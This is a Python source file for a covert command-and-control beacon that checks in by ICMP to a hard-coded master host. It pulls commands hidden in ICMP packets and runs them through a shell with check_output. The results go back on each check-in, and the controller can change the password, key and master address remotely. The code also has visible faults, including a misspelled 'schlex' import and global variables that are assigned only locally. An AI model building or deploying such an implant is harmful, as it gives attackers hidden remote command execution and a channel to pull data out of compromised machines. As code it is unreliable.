import time
import random
import schlex

from tunnel_beacon import *
from subprocess import check_output

MASTER = "10.80.100.24"
RESULTS = ""

def send_error(message):
	send_icmp(CLIENT_ID, MASTER, "ERROR:"+message)
		
def interpret (data):
	if data.startswith("NEW-PASSWORD:"):
		parsed = data.split(":")
		if len(parsed) > 1:
			PASSWORD = parsed[1]
			send_icmp(CLIENT_ID, MASTER, "UPDATED:Password")
		else:
			send_error("Password")
	elif data.startswith("NEW-KEY"):
		parsed = data.split(":")
		if len(parsed) > 1:
			ENCRYPTION_KEY = parsed[1]
			send_icmp(CLIENT_ID, MASTER, "UPDATED:Key")
		else:
			send_error("Key")

	elif data.startswith("NEW-MASTER:"):
		parsed = data.split(":")
		if len(parsed) > 1:
			send_icmp(CLIENT_ID, MASTER, "UPDATED:Master")
			MASTER = parsed[1]
		else:
			send_error("Master")
	else:
		RESULTS = check_output(schlex.split(data), shell=True)
	
def main():
	while True:
		try:
			send_icmp(CLIENT_ID, MASTER, "CHECK-IN:"+RESULTS)
			timeout = time.time()+5
			responded = False
			finished = False
			data = ""
			pack = ""

			while not responded and time.time() < timeout:
				if time.time() > timeout:
					break;
				pack = sniff_icmp()
				if data.startswith(PASSWORD+CLIENT_ID):
					responded = True

			raw = pack.strip(PASSWORD+CLIENT_ID)

			while not finished and time.time() < timeout:

				if not responded:
					pack = sniff_icmp()
					raw = pack.strip(PASSWORD+CLIENT_ID)
				else:
					responded = False
	
				if raw.startswith("!DATAGRAM-START-SEQUENCE!"):
					timeout = time.time()+5
					data = raw.strip("!DATAGRAM-START-SEQUENCE!")
				elif raw.endswith("!DATAGRAM-END-SEQUENCE!"):
					data += raw.strip("!DATAGRAM-END-SEQUENCE!")
					finished = True
				else:
					data += raw
			if finished:
				interpret(data)
			else:
				send_icmp(CLIENT_ID, MASTER, "RESEND-REQUEST") #Request to try again on next check in
			
			time.sleep(random.uniform(60,120)) #Sleep until next check in

		except Exception as e:
			print("Encountered Error:")
			print(e)


